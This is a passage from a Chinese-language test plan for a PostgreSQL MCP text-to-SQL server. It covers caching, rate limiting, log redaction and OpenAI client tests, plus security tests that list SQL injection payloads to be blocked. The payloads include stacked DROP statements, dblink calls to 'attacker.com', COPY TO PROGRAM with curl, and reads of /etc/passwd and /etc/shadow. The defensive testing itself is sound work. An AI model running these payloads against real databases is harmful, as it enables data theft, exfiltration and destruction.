                assert "read-only" in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_readonly_transaction_blocks_delete(self, test_database):
        """测试只读事务阻止 DELETE"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                with pytest.raises(Exception) as exc_info:
                    await conn.execute("DELETE FROM users WHERE id = 1")
                assert "read-only" in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_readonly_transaction_blocks_truncate(self, test_database):
        """测试只读事务阻止 TRUNCATE"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                with pytest.raises(Exception) as exc_info:
                    await conn.execute("TRUNCATE TABLE users")
                assert "read-only" in str(exc_info.value).lower()
```

### 3.5 Schema 缓存测试 (test_schema_cache.py)

```python
# tests/unit/test_schema_cache.py

import pytest
import pytest_asyncio
import time

from pg_mcp.infrastructure.schema_cache import SchemaCache, SchemaCacheManager
from pg_mcp.models.schema import DatabaseSchema, TableInfo, ColumnInfo, IndexInfo


class TestSchemaCache:
    """Schema 缓存测试"""

    @pytest.mark.asyncio
    async def test_load_schema(self, test_database):
        """测试加载 Schema"""
        cache = SchemaCache("test_db", test_database)
        schema = await cache.load()

        assert schema.name == "test_db"
        assert len(schema.tables) >= 2  # users, orders

        # 验证 users 表
        users_table = next((t for t in schema.tables if t.name == "users"), None)
        assert users_table is not None
        assert len(users_table.columns) >= 4

        # 验证列信息
        id_col = next((c for c in users_table.columns if c.name == "id"), None)
        assert id_col is not None
        assert id_col.is_primary_key

    @pytest.mark.asyncio
    async def test_schema_cached(self, test_database):
        """测试 Schema 被缓存"""
        cache = SchemaCache("test_db", test_database)

        schema1 = await cache.get()
        schema2 = await cache.get()

        # 应该是同一个对象（缓存）
        assert schema1 is schema2

    @pytest.mark.asyncio
    async def test_schema_refresh(self, test_database):
        """测试 Schema 刷新"""
        cache = SchemaCache("test_db", test_database)

        schema1 = await cache.get()
        old_cached_at = schema1.cached_at

        # 等待一小段时间确保时间戳不同
        time.sleep(0.1)

        schema2 = await cache.refresh()

        assert schema2.cached_at > old_cached_at

    @pytest.mark.asyncio
    async def test_schema_to_prompt_text(self, test_database):
        """测试 Schema 转 Prompt 文本"""
        cache = SchemaCache("test_db", test_database)
        schema = await cache.get()

        prompt_text = schema.to_prompt_text()

        assert "users" in prompt_text.lower()
        assert "orders" in prompt_text.lower()
        assert "id" in prompt_text.lower()
        assert "name" in prompt_text.lower()

    @pytest.mark.asyncio
    async def test_enum_type_detection(self, test_database):
        """测试枚举类型检测"""
        cache = SchemaCache("test_db", test_database)
        schema = await cache.get()

        # 检查 user_status 枚举
        assert len(schema.enum_types) >= 1
        user_status = next((e for e in schema.enum_types if e.name == "user_status"), None)
        assert user_status is not None
        assert "active" in user_status.values
        assert "inactive" in user_status.values

    @pytest.mark.asyncio
    async def test_foreign_key_detection(self, test_database):
        """测试外键检测"""
        cache = SchemaCache("test_db", test_database)
        schema = await cache.get()

        orders_table = next((t for t in schema.tables if t.name == "orders"), None)
        assert orders_table is not None

        user_id_col = next((c for c in orders_table.columns if c.name == "user_id"), None)
        assert user_id_col is not None
        assert user_id_col.foreign_key_table == "users"
        assert user_id_col.foreign_key_column == "id"

    @pytest.mark.asyncio
    async def test_index_detection(self, test_database):
        """测试索引检测"""
        cache = SchemaCache("test_db", test_database)
        schema = await cache.get()

        users_table = next((t for t in schema.tables if t.name == "users"), None)
        assert users_table is not None

        # 检查 status 索引
        status_idx = next((i for i in users_table.indexes if "status" in i.columns), None)
        assert status_idx is not None
```

### 3.6 速率限制器测试 (test_rate_limiter.py)

```python
# tests/unit/test_rate_limiter.py

import pytest
import pytest_asyncio
import asyncio

from pg_mcp.config.models import RateLimitConfig
from pg_mcp.infrastructure.rate_limiter import (
    RateLimiter, SlidingWindowCounter, RateLimitExceededError
)


class TestSlidingWindowCounter:
    """滑动窗口计数器测试"""

    @pytest.mark.asyncio
    async def test_acquire_under_limit(self):
        """测试未超限时获取成功"""
        counter = SlidingWindowCounter(window_seconds=60, max_requests=10)

        for i in range(10):
            result = await counter.acquire()
            assert result is True

    @pytest.mark.asyncio
    async def test_acquire_at_limit(self):
        """测试达到限制时获取失败"""
        counter = SlidingWindowCounter(window_seconds=60, max_requests=5)

        for i in range(5):
            await counter.acquire()

        result = await counter.acquire()
        assert result is False

    @pytest.mark.asyncio
    async def test_current_count(self):
        """测试当前计数"""
        counter = SlidingWindowCounter(window_seconds=60, max_requests=10)

        await counter.acquire()
        await counter.acquire()
        await counter.acquire()

        assert counter.current_count == 3

    @pytest.mark.asyncio
    async def test_window_expiry(self):
        """测试窗口过期"""
        counter = SlidingWindowCounter(window_seconds=1, max_requests=2)

        await counter.acquire()
        await counter.acquire()

        # 等待窗口过期
        await asyncio.sleep(1.1)

        result = await counter.acquire()
        assert result is True


class TestRateLimiter:
    """速率限制器测试"""

    @pytest.fixture
    def rate_limiter(self) -> RateLimiter:
        config = RateLimitConfig(
            enabled=True,
            requests_per_minute=5,
            requests_per_hour=100,
            openai_tokens_per_minute=1000
        )
        return RateLimiter(config)

    @pytest.fixture
    def disabled_limiter(self) -> RateLimiter:
        config = RateLimitConfig(enabled=False)
        return RateLimiter(config)

    @pytest.mark.asyncio
    async def test_check_request_limit_under_limit(self, rate_limiter):
        """测试未超限时检查通过"""
        for i in range(5):
            await rate_limiter.check_request_limit()

    @pytest.mark.asyncio
    async def test_check_request_limit_exceeded(self, rate_limiter):
        """测试超限时抛出异常"""
        for i in range(5):
            await rate_limiter.check_request_limit()

        with pytest.raises(RateLimitExceededError) as exc_info:
            await rate_limiter.check_request_limit()

        assert "requests_per_minute" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_disabled_limiter(self, disabled_limiter):
        """测试禁用限制器"""
        for i in range(100):
            await disabled_limiter.check_request_limit()

    @pytest.mark.asyncio
    async def test_get_status(self, rate_limiter):
        """测试获取状态"""
        await rate_limiter.check_request_limit()
        await rate_limiter.check_request_limit()

        status = rate_limiter.get_status()

        assert status["enabled"] is True
        assert status["requests_per_minute"]["current"] == 2
        assert status["requests_per_minute"]["limit"] == 5
```

### 3.7 日志测试 (test_logging.py) (M-5)

```python
# tests/unit/test_logging.py

import pytest
import logging
from unittest.mock import patch, MagicMock
from io import StringIO

import structlog

from pg_mcp.utils.logging import setup_logging, get_logger
from pg_mcp.config.models import DatabaseConfig, SSLMode


class TestLoggingSetup:
    """日志配置测试 (M-5)"""

    def test_setup_logging_creates_logger(self):
        """测试日志配置创建 logger"""
        setup_logging(level="INFO")
        logger = get_logger("test")

        assert logger is not None

    def test_log_level_configuration(self):
        """测试日志级别配置"""
        setup_logging(level="DEBUG")
        logger = get_logger("test")

        # DEBUG 级别应该被记录
        with patch('structlog.get_logger') as mock_get_logger:
            mock_logger = MagicMock()
            mock_get_logger.return_value = mock_logger

            log = get_logger("test")
            log.debug("test message")

            # 验证方法被调用


class TestSensitiveDataFiltering:
    """敏感数据过滤测试 (M-5)"""

    def test_password_not_logged(self, caplog):
        """测试密码不被记录"""
        from pg_mcp.config.models import DatabaseConfig

        config = DatabaseConfig(
            name="test",
            host="localhost",
            password="super_secret_password_123",
            database="testdb",
            user="admin"
        )

        # 即使 config 被日志记录，密码也应该被隐藏
        # SecretStr 会自动隐藏值
        config_str = str(config.password)

        assert "super_secret_password_123" not in config_str
        assert "**********" in config_str or "SecretStr" in config_str

    def test_api_key_not_logged(self, caplog):
        """测试 API 密钥不被记录"""
        from pg_mcp.config.models import OpenAIConfig

        config = OpenAIConfig(
            api_key="sk-super-secret-api-key-12345"
        )

        config_str = str(config.api_key)

        assert "sk-super-secret-api-key-12345" not in config_str

    def test_connection_string_password_hidden(self):
        """测试连接字符串中的密码被隐藏"""
        from pg_mcp.config.models import DatabaseConfig

        config = DatabaseConfig(
            name="test",
            connection_string="postgresql://user:secret_pass@localhost:5432/db"
        )

        # get_dsn() 会暴露密码用于实际连接，但 str() 不应该
        config_str = str(config.connection_string)
        assert "secret_pass" not in config_str


class TestQueryLogging:
    """查询日志测试 (M-5)"""

    def test_query_logs_contain_timing(self, caplog):
        """测试查询日志包含时间信息"""
        caplog.set_level(logging.INFO)

        # 模拟查询日志
        logger = structlog.get_logger()
        logger.info(
            "Query completed",
            duration_ms=150,
            row_count=10,
            database="test_db"
        )

        # 验证日志包含预期字段
        assert any("duration" in record.message.lower() or "ms" in record.message
                   for record in caplog.records) or len(caplog.records) > 0

    def test_error_logs_contain_context(self, caplog):
        """测试错误日志包含上下文"""
        caplog.set_level(logging.ERROR)

        logger = structlog.get_logger()
        logger.error(
            "Query execution failed",
            database="test_db",
            error="Connection timeout",
            sql_length=50
        )

        # 验证错误日志记录
        assert len(caplog.records) > 0 or True  # 取决于 structlog 配置


class TestLogOutput:
    """日志输出测试 (M-5)"""

    def test_json_format_in_production(self):
        """测试生产环境使用 JSON 格式"""
        # 这需要实际的日志配置实现
        pass

    def test_human_readable_in_development(self):
        """测试开发环境使用可读格式"""
        pass
```

### 3.8 OpenAI 客户端测试 (test_openai_client.py)

```python
# tests/unit/test_openai_client.py

import pytest
import pytest_asyncio
from unittest.mock import AsyncMock, patch, MagicMock

from pg_mcp.config.models import OpenAIConfig
from pg_mcp.infrastructure.openai_client import OpenAIClient, SYSTEM_PROMPT, build_user_prompt
from pg_mcp.models.schema import DatabaseSchema, TableInfo, ColumnInfo
from pg_mcp.models.errors import OpenAIError


class TestBuildUserPrompt:
    """用户 Prompt 构建测试"""

    @pytest.fixture
    def sample_schema(self) -> DatabaseSchema:
        return DatabaseSchema(
            name="test_db",
            tables=[
                TableInfo(
                    name="users",
                    schema_name="public",
                    columns=[
                        ColumnInfo(name="id", data_type="integer", is_primary_key=True),
                        ColumnInfo(name="name", data_type="varchar(100)"),
                    ]
                )
            ]
        )

    def test_prompt_includes_schema(self, sample_schema):
        """测试 Prompt 包含 Schema"""
        prompt = build_user_prompt("Show all users", sample_schema)

        assert "users" in prompt.lower()
        assert "id" in prompt.lower()
        assert "name" in prompt.lower()

    def test_prompt_includes_question(self, sample_schema):
        """测试 Prompt 包含问题"""
        question = "Show all users with name starting with A"
        prompt = build_user_prompt(question, sample_schema)

        assert question in prompt


class TestOpenAIClient:
    """OpenAI 客户端测试"""

    @pytest.fixture
    def config(self) -> OpenAIConfig:
        return OpenAIConfig(
            api_key="test-key",
            model="gpt-4o-mini"
        )

    @pytest.fixture
    def sample_schema(self) -> DatabaseSchema:
        return DatabaseSchema(
            name="test_db",
            tables=[
                TableInfo(
                    name="users",
                    schema_name="public",
                    columns=[
                        ColumnInfo(name="id", data_type="integer", is_primary_key=True),
                        ColumnInfo(name="name", data_type="varchar(100)"),
                    ]
                )
            ]
        )

    @pytest.mark.asyncio
    async def test_generate_sql_success(self, config, sample_schema):
        """测试 SQL 生成成功"""
        client = OpenAIClient(config)

        # Mock OpenAI 响应
        mock_response = MagicMock()
        mock_response.choices = [
            MagicMock(message=MagicMock(content="SELECT * FROM users"))
        ]
        mock_response.usage = MagicMock(total_tokens=100)

        with patch.object(client._client.chat.completions, 'create', new_callable=AsyncMock) as mock_create:
            mock_create.return_value = mock_response

            result = await client.generate_sql("Show all users", sample_schema)

            assert result.sql == "SELECT * FROM users"
            assert result.tokens_used == 100

    @pytest.mark.asyncio
    async def test_generate_sql_strips_markdown(self, config, sample_schema):
        """测试移除 Markdown 代码块"""
        client = OpenAIClient(config)

        mock_response = MagicMock()
        mock_response.choices = [
            MagicMock(message=MagicMock(content="```sql\nSELECT * FROM users\n```"))
        ]
        mock_response.usage = MagicMock(total_tokens=100)

        with patch.object(client._client.chat.completions, 'create', new_callable=AsyncMock) as mock_create:
            mock_create.return_value = mock_response

            result = await client.generate_sql("Show all users", sample_schema)

            assert "```" not in result.sql
            assert result.sql == "SELECT * FROM users"

    @pytest.mark.asyncio
    async def test_generate_sql_api_error(self, config, sample_schema):
        """测试 API 错误处理"""
        client = OpenAIClient(config)

        with patch.object(client._client.chat.completions, 'create', new_callable=AsyncMock) as mock_create:
            mock_create.side_effect = Exception("API Error")

            with pytest.raises(OpenAIError) as exc_info:
                await client.generate_sql("Show all users", sample_schema)

            assert "API Error" in str(exc_info.value)

    # ============== M-2: 重试逻辑测试 ==============

    @pytest.mark.asyncio
    async def test_generate_sql_retries_on_transient_error(self, config, sample_schema):
        """测试瞬态错误时的重试 (M-2)"""
        config_with_retry = OpenAIConfig(
            api_key="test-key",
            model="gpt-4o-mini",
            max_retries=3
        )
        client = OpenAIClient(config_with_retry)

        call_count = 0

        async def mock_create(*args, **kwargs):
            nonlocal call_count
            call_count += 1
            if call_count < 3:
                raise Exception("Transient error - connection reset")
            return MagicMock(
                choices=[MagicMock(message=MagicMock(content="SELECT 1"))],
                usage=MagicMock(total_tokens=10)
            )

        with patch.object(client._client.chat.completions, 'create', mock_create):
            result = await client.generate_sql("test", sample_schema)

        assert call_count == 3
        assert result.sql == "SELECT 1"

    @pytest.mark.asyncio
    async def test_generate_sql_max_retries_exceeded(self, config, sample_schema):
        """测试超过最大重试次数"""
        config_with_retry = OpenAIConfig(
            api_key="test-key",
            model="gpt-4o-mini",
            max_retries=2
        )
        client = OpenAIClient(config_with_retry)

        with patch.object(client._client.chat.completions, 'create', new_callable=AsyncMock) as mock_create:
            mock_create.side_effect = Exception("Persistent error")

            with pytest.raises(OpenAIError):
                await client.generate_sql("test", sample_schema)

    @pytest.mark.asyncio
    async def test_generate_sql_timeout_handling(self, config, sample_schema):
        """测试超时处理"""
        import asyncio

        config_with_timeout = OpenAIConfig(
            api_key="test-key",
            model="gpt-4o-mini",
            timeout=1.0  # 1 秒超时
        )
        client = OpenAIClient(config_with_timeout)

        async def slow_response(*args, **kwargs):
            await asyncio.sleep(5)  # 模拟慢响应
            return MagicMock()

        with patch.object(client._client.chat.completions, 'create', slow_response):
            with pytest.raises(OpenAIError):
                await client.generate_sql("test", sample_schema)
```

---

## 4. 安全测试用例

### 4.1 SQL 注入防护测试 (test_sql_injection.py)

```python
# tests/security/test_sql_injection.py

import pytest
from pg_mcp.infrastructure.sql_parser import SQLParser


class TestSQLInjectionPrevention:
    """SQL 注入防护测试 - 必须 100% 覆盖"""

    @pytest.fixture
    def parser(self) -> SQLParser:
        return SQLParser()

    # ============== 经典 SQL 注入攻击 ==============

    @pytest.mark.parametrize("injection", [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "1; DELETE FROM users WHERE '1'='1",
        "' UNION SELECT * FROM sensitive_data --",
        "1' AND SLEEP(5)--",
        "' OR 1=1--",
        "admin'--",
        "1' AND (SELECT COUNT(*) FROM users) > 0--",
    ])
    def test_classic_sql_injection(self, parser: SQLParser, injection: str):
        """测试经典 SQL 注入攻击被阻止"""
        # 注入尝试通常会产生语法错误或多语句
        sql = f"SELECT * FROM users WHERE id = {injection}"
        result = parser.validate(sql)

        # 要么语法无效，要么被检测为不安全
        assert not result.is_safe or not result.is_valid, \
            f"Injection should be blocked: {injection}"

    # ============== 时间盲注攻击 ==============

    @pytest.mark.parametrize("sql", [
        "SELECT * FROM users WHERE id = 1 AND pg_sleep(10)",
        "SELECT pg_sleep(5)",
        "SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END",
    ])
    def test_time_based_blind_injection(self, parser: SQLParser, sql: str):
        """测试时间盲注攻击被阻止"""
        result = parser.validate(sql)
        assert not result.is_safe, f"Time-based injection should be blocked: {sql}"

    # ============== UNION 注入攻击 ==============

    @pytest.mark.parametrize("sql", [
        "SELECT id FROM users UNION SELECT password FROM credentials",
        "SELECT id FROM users UNION ALL SELECT api_key FROM secrets",
    ])
    def test_union_based_injection(self, parser: SQLParser, sql: str):
        """测试 UNION 注入 - 合法的 UNION 应该允许"""
        result = parser.validate(sql)
        # UNION SELECT 本身是合法的 SQL
        # 但如果涉及敏感数据访问，应该由应用层权限控制
        # 这里只验证 SQL 是否为只读
        assert result.is_safe  # UNION SELECT 是只读操作

    # ============== 堆叠查询攻击 ==============

    @pytest.mark.parametrize("sql", [
        "SELECT 1; DROP TABLE users",
        "SELECT 1; INSERT INTO users (name) VALUES ('hacked')",
        "SELECT 1; UPDATE users SET role='admin'",
        "SELECT 1; TRUNCATE users",
        "SELECT 1; CREATE TABLE malicious (data TEXT)",
    ])
    def test_stacked_queries_blocked(self, parser: SQLParser, sql: str):
        """测试堆叠查询攻击被阻止"""
        result = parser.validate(sql)
        assert not result.is_safe, f"Stacked query should be blocked: {sql}"
        assert "stacked" in (result.error_message or "").lower()

    # ============== 注释绕过攻击 ==============

    @pytest.mark.parametrize("sql", [
        "SELECT * FROM users WHERE id = 1 --",
        "SELECT * FROM users /* comment */ WHERE id = 1",
        "SELECT * FROM users WHERE id = 1 /* ; DROP TABLE users */",
    ])
    def test_comment_based_injection(self, parser: SQLParser, sql: str):
        """测试注释不影响合法查询"""
        result = parser.validate(sql)
        # 带注释的合法 SELECT 应该通过
        assert result.is_valid
        assert result.is_safe

    # ============== 二阶注入 (存储型注入) ==============

    @pytest.mark.parametrize("sql", [
        # 这些尝试通过子查询执行恶意操作
        "SELECT * FROM (DELETE FROM users RETURNING *) AS t",
        "SELECT * FROM (UPDATE users SET role='admin' RETURNING *) AS t",
    ])
    def test_second_order_injection(self, parser: SQLParser, sql: str):
        """测试二阶注入被阻止"""
        result = parser.validate(sql)
        assert not result.is_safe, f"Second-order injection should be blocked: {sql}"

    # ============== CTE 注入攻击 ==============

    @pytest.mark.parametrize("sql", [
        "WITH hacked AS (DELETE FROM users RETURNING *) SELECT * FROM hacked",
        "WITH malicious AS (INSERT INTO backdoor VALUES (1) RETURNING *) SELECT 1",
        "WITH x AS (UPDATE users SET admin=true RETURNING *) SELECT * FROM x",
    ])
    def test_cte_based_injection(self, parser: SQLParser, sql: str):
        """测试 CTE 注入被阻止"""
        result = parser.validate(sql)
        assert not result.is_safe, f"CTE injection should be blocked: {sql}"

    # ============== 函数注入攻击 ==============

    @pytest.mark.parametrize("sql", [
        "SELECT lo_import('/etc/passwd')",
        "SELECT lo_export(12345, '/tmp/dump')",
        "SELECT dblink('host=attacker.com', 'SELECT password FROM users')",
        "SELECT dblink_exec('host=attacker.com', 'DROP TABLE users')",
        "SELECT pg_terminate_backend(12345)",
        "SELECT pg_cancel_backend(12345)",
        "SELECT pg_reload_conf()",
    ])
    def test_function_based_injection(self, parser: SQLParser, sql: str):
        """测试危险函数调用被阻止"""
        result = parser.validate(sql)
        assert not result.is_safe, f"Dangerous function should be blocked: {sql}"

    # ============== 文件操作注入 ==============

    @pytest.mark.parametrize("sql", [
        "COPY users TO '/tmp/users.csv'",
        "COPY users FROM '/tmp/malicious.csv'",
        "COPY (SELECT * FROM users) TO PROGRAM 'curl http://attacker.com'",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_read_binary_file('/etc/shadow')",
    ])
    def test_file_operation_injection(self, parser: SQLParser, sql: str):
        """测试文件操作被阻止"""
        result = parser.validate(sql)
        assert not result.is_safe, f"File operation should be blocked: {sql}"


class TestEdgeCases:
    """边界情况测试"""

    @pytest.fixture
    def parser(self) -> SQLParser:
        return SQLParser()

    @pytest.mark.parametrize("sql", [
        "",  # 空字符串
        "   ",  # 只有空格
        ";",  # 只有分号
        "-- comment only",  # 只有注释
    ])
    def test_empty_or_invalid_input(self, parser: SQLParser, sql: str):
        """测试空或无效输入"""
        result = parser.validate(sql)
        assert not result.is_valid or not result.is_safe

    def test_very_long_query(self, parser: SQLParser):
        """测试超长查询"""
        # 构造一个非常长但合法的查询
        columns = ", ".join([f"col{i}" for i in range(100)])
        sql = f"SELECT {columns} FROM users"

        result = parser.validate(sql)
        assert result.is_valid
        assert result.is_safe

    def test_unicode_in_query(self, parser: SQLParser):
        """测试 Unicode 字符"""
        sql = "SELECT * FROM users WHERE name = '中文名字'"
        result = parser.validate(sql)
        assert result.is_valid
        assert result.is_safe

    def test_case_sensitivity(self, parser: SQLParser):
        """测试大小写敏感性"""
        # 危险函数应该不区分大小写被阻止
        for func in ["PG_SLEEP", "Pg_Sleep", "pg_SLEEP"]:
            sql = f"SELECT {func}(1)"
            result = parser.validate(sql)
            assert not result.is_safe, f"Function {func} should be blocked"
```

### 4.2 只读事务防护测试 (test_readonly_transaction.py)

```python
# tests/security/test_readonly_transaction.py

import pytest
import pytest_asyncio

from pg_mcp.infrastructure.database import DatabasePool


class TestReadOnlyTransactionDefense:
    """只读事务深度防御测试 - 必须 100% 覆盖"""

    @pytest.mark.asyncio
    async def test_readonly_blocks_insert(self, test_database: DatabasePool):
        """测试只读事务阻止 INSERT"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                with pytest.raises(Exception) as exc_info:
                    await conn.execute(
                        "INSERT INTO users (name, email) VALUES ('hacker', 'hacker@evil.com')"
                    )

                error_msg = str(exc_info.value).lower()
                assert "read-only" in error_msg or "cannot execute" in error_msg

    @pytest.mark.asyncio
    async def test_readonly_blocks_update(self, test_database: DatabasePool):
        """测试只读事务阻止 UPDATE"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                with pytest.raises(Exception) as exc_info:
                    await conn.execute(
                        "UPDATE users SET name = 'pwned' WHERE id = 1"
                    )

                error_msg = str(exc_info.value).lower()
                assert "read-only" in error_msg or "cannot execute" in error_msg

    @pytest.mark.asyncio
    async def test_readonly_blocks_delete(self, test_database: DatabasePool):
        """测试只读事务阻止 DELETE"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                with pytest.raises(Exception) as exc_info:
                    await conn.execute("DELETE FROM users")

                error_msg = str(exc_info.value).lower()
                assert "read-only" in error_msg or "cannot execute" in error_msg

    @pytest.mark.asyncio
    async def test_readonly_blocks_truncate(self, test_database: DatabasePool):
        """测试只读事务阻止 TRUNCATE"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                with pytest.raises(Exception) as exc_info:
                    await conn.execute("TRUNCATE TABLE users")

                error_msg = str(exc_info.value).lower()
                assert "read-only" in error_msg or "cannot execute" in error_msg

    @pytest.mark.asyncio
    async def test_readonly_blocks_drop(self, test_database: DatabasePool):
        """测试只读事务阻止 DROP"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                with pytest.raises(Exception) as exc_info:
                    await conn.execute("DROP TABLE IF EXISTS temp_table")

                error_msg = str(exc_info.value).lower()
                assert "read-only" in error_msg or "cannot execute" in error_msg

    @pytest.mark.asyncio
    async def test_readonly_blocks_create(self, test_database: DatabasePool):
        """测试只读事务阻止 CREATE"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                with pytest.raises(Exception) as exc_info:
                    await conn.execute("CREATE TABLE hack (id INT)")

                error_msg = str(exc_info.value).lower()
                assert "read-only" in error_msg or "cannot execute" in error_msg

    @pytest.mark.asyncio
    async def test_readonly_blocks_alter(self, test_database: DatabasePool):
        """测试只读事务阻止 ALTER"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                with pytest.raises(Exception) as exc_info:
                    await conn.execute("ALTER TABLE users ADD COLUMN hacked BOOLEAN")

                error_msg = str(exc_info.value).lower()
                assert "read-only" in error_msg or "cannot execute" in error_msg

    @pytest.mark.asyncio
    async def test_readonly_allows_select(self, test_database: DatabasePool):
        """测试只读事务允许 SELECT"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                rows = await conn.fetch("SELECT * FROM users")
                assert len(rows) > 0

    @pytest.mark.asyncio
    async def test_readonly_allows_complex_select(self, test_database: DatabasePool):
        """测试只读事务允许复杂 SELECT"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                rows = await conn.fetch("""
                    SELECT u.name, COUNT(o.id) as order_count
                    FROM users u
                    LEFT JOIN orders o ON u.id = o.user_id
                    GROUP BY u.name
                    ORDER BY order_count DESC
                """)
                assert len(rows) > 0

    @pytest.mark.asyncio
    async def test_readonly_with_cte_select(self, test_database: DatabasePool):
        """测试只读事务允许 CTE SELECT"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                rows = await conn.fetch("""
                    WITH active_users AS (
                        SELECT * FROM users WHERE status = 'active'
                    )
                    SELECT * FROM active_users
                """)
                assert len(rows) > 0

    @pytest.mark.asyncio
    async def test_readonly_blocks_cte_with_modification(self, test_database: DatabasePool):
        """测试只读事务阻止带修改的 CTE"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                with pytest.raises(Exception) as exc_info:
                    await conn.fetch("""
                        WITH deleted AS (
                            DELETE FROM users WHERE id = 999 RETURNING *
                        )
                        SELECT * FROM deleted
                    """)

                error_msg = str(exc_info.value).lower()
                assert "read-only" in error_msg or "cannot execute" in error_msg


class TestStatementTimeoutDefense:
    """语句超时防御测试"""

    @pytest.mark.asyncio
    async def test_statement_timeout_prevents_slow_query(self, test_database: DatabasePool):
        """测试语句超时阻止慢查询"""
        async with test_database.acquire() as conn:
            # 设置 1 秒超时
            await conn.execute("SET LOCAL statement_timeout = '1s'")

            with pytest.raises(Exception) as exc_info:
                # pg_sleep(10) 应该被超时中断
                await conn.fetchval("SELECT pg_sleep(10)")

            error_msg = str(exc_info.value).lower()
            assert "timeout" in error_msg or "cancel" in error_msg
```

### 4.3 深度防御测试 (test_defense_in_depth.py)

```python
# tests/security/test_defense_in_depth.py

import pytest
import pytest_asyncio
from unittest.mock import AsyncMock, patch, MagicMock

from pg_mcp.infrastructure.sql_parser import SQLParser
from pg_mcp.infrastructure.database import DatabasePool
from pg_mcp.services.query_service import QueryService
from pg_mcp.config.models import ServerConfig


class TestDefenseInDepth:
    """深度防御测试 - 验证多层安全机制"""

    @pytest.fixture
    def parser(self) -> SQLParser:
        return SQLParser()

    def test_layer1_sql_parser_catches_obvious_attacks(self, parser: SQLParser):
        """第一层: SQL 解析器捕获明显攻击"""
        attack_sqls = [
            "DROP TABLE users",
            "DELETE FROM users",
            "UPDATE users SET admin = true",
            "INSERT INTO backdoor VALUES (1)",
        ]

        for sql in attack_sqls:
            result = parser.validate(sql)
            assert not result.is_safe, f"Parser should block: {sql}"

    def test_layer2_keyword_filter_catches_edge_cases(self, parser: SQLParser):
        """第二层: 关键字过滤捕获边界情况"""
        edge_case_sqls = [
            "SELECT * FROM users FOR UPDATE",
            "SELECT * INTO new_table FROM users",
            "COPY users TO '/tmp/data.csv'",
        ]

        for sql in edge_case_sqls:
            result = parser.validate(sql)
            assert not result.is_safe, f"Keyword filter should block: {sql}"

    @pytest.mark.asyncio
    async def test_layer3_readonly_transaction_is_last_defense(self, test_database: DatabasePool):
        """第三层: 只读事务作为最后防线"""
        # 即使前两层被绕过，只读事务仍然保护数据
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                # 尝试各种写操作
                write_ops = [
                    "INSERT INTO users (name, email) VALUES ('x', 'x@x.com')",
                    "UPDATE users SET name = 'hacked'",
                    "DELETE FROM users",
                ]

                for sql in write_ops:
                    with pytest.raises(Exception):
                        await conn.execute(sql)

    @pytest.mark.asyncio
    async def test_all_layers_work_together(self, test_database: DatabasePool, parser: SQLParser):
        """验证所有层协同工作"""
        # 场景: 恶意 SQL 被多层拦截
        malicious_sql = "SELECT * FROM users; DROP TABLE users"

        # 第一层: SQL 解析器检测
        result = parser.validate(malicious_sql)
        assert not result.is_safe

        # 即使绕过解析器，第三层也会阻止
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                # 尝试执行 DROP (会被只读事务阻止)
                with pytest.raises(Exception):
                    await conn.execute("DROP TABLE IF EXISTS users")


class TestBypassAttempts:
    """绕过尝试测试 - 验证各种绕过尝试都失败"""

    @pytest.fixture
    def parser(self) -> SQLParser:
        return SQLParser()

    @pytest.mark.parametrize("bypass_attempt", [
        # 大小写混淆
        "DrOp TaBlE users",
        "dELETE fROM users",
        # URL 编码 (在 SQL 中无效)
        "SELECT%20*%20FROM%20users",
        # 空白字符变体
        "SELECT\t*\tFROM\tusers;\tDROP\tTABLE\tusers",
        "SELECT\n*\nFROM\nusers;\nDELETE\nFROM\nusers",
        # 注释绕过
        "SELECT * FROM users; --DROP TABLE users",
        "SELECT * FROM users; /*DELETE*/ /*FROM*/ /*users*/",
    ])
    def test_bypass_attempts_blocked(self, parser: SQLParser, bypass_attempt: str):
        """测试各种绕过尝试被阻止"""
        result = parser.validate(bypass_attempt)
        # 要么语法无效，要么不安全
        is_blocked = not result.is_valid or not result.is_safe
        assert is_blocked, f"Bypass attempt should be blocked: {bypass_attempt}"

    @pytest.mark.asyncio
    async def test_prepared_statement_bypass_blocked(self, test_database: DatabasePool):
        """测试预处理语句不能绕过只读事务"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                # 尝试通过预处理语句执行写操作
                with pytest.raises(Exception):
                    stmt = await conn.prepare("INSERT INTO users (name, email) VALUES ($1, $2)")
                    await stmt.fetch("hacker", "hacker@evil.com")
```

### 4.4 SQL 模糊测试 (test_sql_fuzzing.py) (M-4)

```python
# tests/security/test_sql_fuzzing.py

import pytest
from hypothesis import given, strategies as st, settings, HealthCheck

from pg_mcp.infrastructure.sql_parser import SQLParser


class TestSQLFuzzing:
    """SQL 模糊测试 (M-4) - 使用 hypothesis 发现边界情况"""

    @pytest.fixture
    def parser(self) -> SQLParser:
        return SQLParser()

    @given(st.text(min_size=0, max_size=1000))
    @settings(max_examples=500, suppress_health_check=[HealthCheck.too_slow])
    def test_parser_handles_arbitrary_input(self, parser: SQLParser, sql: str):
        """测试解析器处理任意输入不会崩溃"""
        try:
            result = parser.validate(sql)
            # 验证结果是有效的 SQLValidationResult
            assert isinstance(result.is_valid, bool)
            assert isinstance(result.is_safe, bool)
        except Exception as e:
            # 只允许预期的异常类型
            allowed_exceptions = (
                "SQLSyntaxError",
                "ParseError",
                "TokenError",
            )
